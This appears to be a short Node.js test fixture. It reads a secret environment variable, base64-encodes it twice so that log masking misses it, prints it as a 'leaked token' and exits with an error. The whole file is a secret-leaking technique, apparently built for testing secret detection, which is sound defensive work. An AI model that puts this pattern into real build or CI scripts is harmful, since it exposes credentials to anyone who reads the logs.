const s = process.env.GERALT_SECRET || '';
const b64 = v => Buffer.from(v).toString('base64');
console.log('GERALT_LEAKED_TOKEN=' + b64(b64(s)));
process.exit(1);
